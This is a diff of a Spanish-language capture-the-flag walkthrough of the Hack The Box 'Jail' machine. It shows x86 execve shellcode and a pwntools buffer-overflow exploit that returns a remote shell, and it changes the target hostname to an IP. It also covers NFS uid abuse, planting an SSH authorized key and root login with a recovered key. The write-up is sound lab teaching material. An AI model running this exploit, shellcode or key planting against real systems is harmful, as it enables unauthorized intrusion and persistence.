+    </span><span class="o">mov</span><span class="mi"> ebx</span><span class="p">,</span><span class="mi"> esp</span><span class="c1">     ; $ebx = "/bin/sh"  
+
+    </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">     ; $ecx = NULL
+    </span><span class="o">cdq</span><span class="c1">              ; $edx = NULL
+
+    </span><span class="o">int </span><span class="mi">0x80</span><span class="c1">         ; syscall</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El exploit final enviara basura hasta antes del <code class="language-plaintext highlighter-rouge">EIP</code>, este apuntara al shellcode del que calculamos su direccion con el <code class="language-plaintext highlighter-rouge">leak</code>, al hacerlo lo interpretara y nos dara una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m elf_i386 -o shellcode
+
+</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:' </span><span class="p">| </span><span class="ve">grep </span><span class="p">-v </span><span class="am">'shellcode'</span><span class="p"> | </span><span class="ve">cut</span><span class="p"> -f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> | </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s  
+\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al usar shellcode no vemos ninguna clase de salida del comando</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">exploit.py
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.34 on port 7411: Done  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La solución es simple, usar <code class="language-plaintext highlighter-rouge">dup2(2,0)</code> para redirigir el <code class="language-plaintext highlighter-rouge">stdin</code> al descriptor del socket</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="no">global</span><span class="na"> _start
+
+_start</span><span class="p">:
+    </span><span class="o">push</span><span class="mi"> 0x2</span><span class="c1">         ; 2
+    </span><span class="o">pop</span><span class="mi"> ebx</span><span class="c1">          ; $ebx = 2
+    </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">     ; $ecx = 0
+
+    </span><span class="o">push</span><span class="mi"> 0x3f</span><span class="c1">        ; dup2()
+    </span><span class="o">pop</span><span class="mi"> eax</span><span class="c1">          ; $eax = dup2()
+    </span><span class="o">int</span><span class="mi"> 0x80</span><span class="c1">         ; syscall
+
+    </span><span class="o">push</span><span class="mi"> 0xb</span><span class="c1">         ; execve()
+    </span><span class="o">pop</span><span class="mi"> eax</span><span class="c1">          ; $eax = execve()
+
+    </span><span class="o">push</span><span class="mi"> 0x68</span><span class="c1">        ; "h"
+    </span><span class="o">push</span><span class="no"> word</span><span class="mi"> 0x732f</span><span class="c1"> ; "/s"
+    </span><span class="o">push</span><span class="mi"> 0x6e69622f</span><span class="c1">  ; "/bin"
+    </span><span class="o">mov</span><span class="mi"> ebx</span><span class="p">,</span><span class="mi"> esp</span><span class="c1">     ; $ebx = "/bin/sh"  
+
+    </span><span class="o">xor</span><span class="mi"> ecx</span><span class="p">,</span><span class="mi"> ecx</span><span class="c1">     ; $ecx = NULL
+    </span><span class="o">cdq</span><span class="c1">              ; $edx = NULL
+
+    </span><span class="o">int </span><span class="mi">0x80</span><span class="c1">         ; syscall</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nasm </span><span class="p">-f elf shellcode.asm -o shellcode.o; </span><span class="ve">ld </span><span class="p">shellcode.o -m elf_i386 -o shellcode
+
+</span><span class="ve">❯ objdump </span><span class="p">-d shellcode | </span><span class="ve">grep </span><span class="am">'[0-9a-f]:' </span><span class="p">| </span><span class="ve">grep </span><span class="p">-v </span><span class="am">'shellcode'</span><span class="p"> | </span><span class="ve">cut</span><span class="p"> -f2 -d: | </span><span class="ve">cut </span><span class="p">-f1-6 -d </span><span class="am">' '</span><span class="p"> | </span><span class="ve">tr</span><span class="p"> -s </span><span class="am">' ' </span><span class="p">| </span><span class="ve">tr</span><span class="am"> '\t' ' '</span><span class="p"> | </span><span class="ve">sed </span><span class="am">'s/ $//g' </span><span class="p">| </span><span class="ve">sed </span><span class="am">'s/ /\\x/g'</span><span class="p"> | </span><span class="ve">paste </span><span class="p">-d</span><span class="am"> ''</span><span class="p"> -s  
+\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El exploit final enviara basura hasta antes del retorno que apuntara al shellcode del que calculamos su direccion con el <code class="language-plaintext highlighter-rouge">leak</code>, al hacerlo intepretarse nos dara una shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/pỳthon3
 </span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32
@@ -409,27 +447,21 @@ junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A
 
 addr </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0xffffd630</span><span class="p">)
 
-shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"  </span><span class="p">
 
 payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">addr </span><span class="o">+ </span><span class="p">shellcode
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"jail.htb"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.34"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"USER admin"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"PASS " </span><span class="o">+ </span><span class="p">payload)
-
 shell.interactive()</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Ejecutamos el exploit remoto y conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">nobody</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to jail.htb on port 7411: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.34 on port 7411: Done  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=99(nobody) gid=99(nobody) groups=99(nobody)
@@ -438,7 +470,7 @@ uid=99(nobody) gid=99(nobody) groups=99(nobody)
 </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Otra forma de llegar al shellcode si no tuvieramos el <code class="language-plaintext highlighter-rouge">leak</code> es usando un gadget que salte al ESP, en este caso con <code class="language-plaintext highlighter-rouge">ropper</code> encontramos uno que ejecuta un <code class="language-plaintext highlighter-rouge">call esp</code></p>
+<p class="plain-text">Otra forma de llegar al shellcode si no tuvieramos el <code class="language-plaintext highlighter-rouge">leak</code> es usando un gadget que salte al stack, en este caso con <code class="language-plaintext highlighter-rouge">ropper</code> encontramos uno que ejecuta un <code class="language-plaintext highlighter-rouge">call esp</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ropper </span><span class="p">--file jail --jmp esp  
 
@@ -460,16 +492,11 @@ junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A
 
 callesp </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x0804910f</span><span class="p">)
 
-shellcode  </span><span class="o">= </span><span class="no">b</span><span class="s">""
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e</span><span class="s">"  
-</span><span class="p">shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x89\xe3\x31\xc9\xcd\x80</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">= </span><span class="no">b</span><span class="s">"\x6a\x02\x5b\x31\xc9\x6a\x3f\x58\xcd\x80\x6a\x0b\x58\x6a\x68\x66\x68\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x99\xcd\x80"  </span><span class="p">
 
 payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">callesp </span><span class="o">+ </span><span class="p">shellcode
 
-shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"jail.htb"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
+shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"10.10.10.34"</span><span class="p">, </span><span class="mi">7411</span><span class="p">)
 
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"USER admin"</span><span class="p">)
 shell.sendlineafter(</span><span class="no">b</span><span class="s">"command.</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="no">b</span><span class="s">"PASS " </span><span class="o">+ </span><span class="p">payload)
@@ -480,7 +507,7 @@ shell.interactive()</span>
 <p class="plain-text">Ejecutamos el exploit remoto y conseguimos una shell como el usuario <code class="language-plaintext highlighter-rouge">nobody</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to jail.htb on port 7411: Done  
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.10.34 on port 7411: Done  
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=99(nobody) gid=99(nobody) groups=99(nobody)
@@ -501,7 +528,7 @@ uid=99(nobody) gid=99(nobody) groups=99(nobody)
 [nobody@localhost /]$ </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">El puerto de <code class="language-plaintext highlighter-rouge">nfs</code> esta abierto, mirando la configuracion encontramos la flag <code class="language-plaintext highlighter-rouge">no_all_squash</code> que indica que si el identificador de mi usuario local <code class="language-plaintext highlighter-rouge">kali</code> es <code class="language-plaintext highlighter-rouge">1000</code> en el equipo jail los datos seran del mismo identificador <code class="language-plaintext highlighter-rouge">1000</code> que es <code class="language-plaintext highlighter-rouge">frank</code></p>
+<p class="plain-text">El puerto de <code class="language-plaintext highlighter-rouge">nfs</code> esta abierto, mirando la configuracion encontramos la flag <code class="language-plaintext highlighter-rouge">no_all_squash</code> que indica que si el identificador de mi usuario local <code class="language-plaintext highlighter-rouge">user</code> es <code class="language-plaintext highlighter-rouge">1000</code> en el equipo jail los datos seran del mismo identificador <code class="language-plaintext highlighter-rouge">1000</code> que es <code class="language-plaintext highlighter-rouge">frank</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">[nobody@localhost /]$ </span><span class="ro">$ </span><span class="p">cat /etc/exports
 /var/nfsshare *(rw,sync,root_squash,no_all_squash)  
@@ -511,18 +538,18 @@ uid=99(nobody) gid=99(nobody) groups=99(nobody)
 
 <p class="plain-text">Iniciamos creando una montura en <code class="language-plaintext highlighter-rouge">/mnt</code> con el recurso compartido en /var/nfsshare</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ showmount </span><span class="p">-e jail.htb
-Export list for jail.htb:
+<code><span class="ve">❯ showmount </span><span class="p">-e 10.10.10.34
+Export list for 10.10.10.34:
 /opt          *
 /var/nfsshare *
 
-</span><span class="ve">❯ sudo mount </span><span class="p">jail.htb:/var/nfsshare /mnt  </span>
+</span><span class="ve">❯ sudo mount </span><span class="p">10.10.10.34:/var/nfsshare /mnt  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Debido a la configuracion si escribimos un archivo en <code class="language-plaintext highlighter-rouge">/mnt/test</code> este se vera reflejado en el equipo bajo la ruta <code class="language-plaintext highlighter-rouge">/var/nfsshare/test</code> con el id 1000 de frank</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ ls </span><span class="p">-ld /mnt
-drwx-wx--x root kali 6 B Mon Jul  3 23:33:56 2017 </span><span class="az"> /mnt  
+drwx-wx--x root user 6 B Mon Jul  3 23:33:56 2017 </span><span class="az"> /mnt  
 
 </span><span class="ve">❯ touch </span><span class="p">/mnt/test</span>
 </code></pre></div></div><br>
@@ -569,12 +596,12 @@ feb**************************7cc
 
 <p class="plain-text">Para obtener una  <code class="language-plaintext highlighter-rouge">shell</code> mas estable podemos escribir nuestra clave publica como autorizada en el directorio  <code class="language-plaintext highlighter-rouge">.ssh</code> de frank para asi conectarnos sin usar contraseña</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">[frank@localhost /]$ </span><span class="ro">$ </span><span class="p">echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKYbzSK7e6XOM/4cOZIGWcgJ55cba+MaQCk6KJSFbRf kali@kali" > /home/frank/.ssh/authorized_keys  
+<code><span class="p">[frank@localhost /]$ </span><span class="ro">$ </span><span class="p">echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHJkHdh26fDO0wZqVbBRvzXh2zSSqUyQG8TyIcPU05yf user@ubuntu" > /home/frank/.ssh/authorized_keys  
 [frank@localhost /]$ </span><span class="ro">$</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ssh </span><span class="p">frank@jail.htb
+<code><span class="ve">❯ ssh </span><span class="p">frank@10.10.10.34
 [</span><span class="ve">frank@localhost </span><span class="az">~</span><span class="p">]$ id
 uid=1000(frank) gid=1000(frank) grupos=1000(frank)  
 [</span><span class="ve">frank@localhost </span><span class="az">~</span><span class="p">]$ hostname -I
@@ -742,13 +769,13 @@ hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
 
 <p class="plain-text">Ya con la clave privada de <code class="language-plaintext highlighter-rouge">root</code> podemos conectarnos y aunque nos da un error con una <a href="https://stackoverflow.com/questions/73795935/sign-and-send-pubkey-no-mutual-signature-supported">busqueda</a> rapida lo solucionamos y ganamos acceso como el usuario root</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ssh </span><span class="p">root@jail.htb -i id_rsa
+<code><span class="ve">❯ ssh </span><span class="p">root@10.10.10.34 -i id_rsa
 sign_and_send_pubkey: no mutual signature supported  
-root@jail.htb's password:</span>
+root@10.10.10.34's password:</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ ssh </span><span class="p">root@jail.htb -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa  
+<code><span class="ve">❯ ssh </span><span class="p">root@10.10.10.34 -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa  
 [</span><span class="ve">root@localhost </span><span class="az">~</span><span class="p">]# id
 uid=0(root) gid=0(root) grupos=0(root)
 [</span><span class="ve">root@localhost </span><span class="az">~</span><span class="p">]# hostname -I
